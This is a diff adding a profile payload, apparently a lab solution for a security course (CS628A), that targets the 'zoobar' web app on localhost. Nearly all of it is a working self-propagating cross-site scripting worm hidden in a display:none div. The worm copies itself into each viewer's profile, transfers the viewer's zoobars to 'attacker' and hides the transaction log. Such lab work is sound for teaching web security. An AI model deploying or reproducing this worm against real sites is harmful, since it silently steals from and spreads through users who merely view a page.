@@ -1,0 +1,26 @@
+I Love CS628A!
+<div id="here" style="display :none;">
+<script>
+    var zoobar = 1;
+
+    var profile = new XMLHttpRequest();
+    profile.open('POST', 'http://localhost:8080/zoobar/index.cgi/');
+    profile.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    var content = 'I Love CS628A!' + '<div id="here" style="display:none;">' + document.getElementById("here").innerHTML + '<'+'/div><span id="zoobars" class="10"><'+'/span>';
+    content = content.replace(/zoobar = (\d+)+/g, function(match, number) {
+                    var num = parseInt(number)+1;
+                    return "zoobar = " + num;
+                });
+    profile.send('profile_update=' + encodeURIComponent(content) + '&profile_submit=Save');
+
+    var transfer = new XMLHttpRequest();
+    transfer.open('POST', 'http://localhost:8080/zoobar/index.cgi/transfer');
+    transfer.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    transfer.send('zoobars='+zoobar+'&recipient=attacker&submission=Send');
+    
+    window.onload = function(){ document.getElementsByClassName("log")[0].style.visibility = 'hidden';}
+</script>
+</div>
+<span id="zoobars" class="10"></span> 
+
+
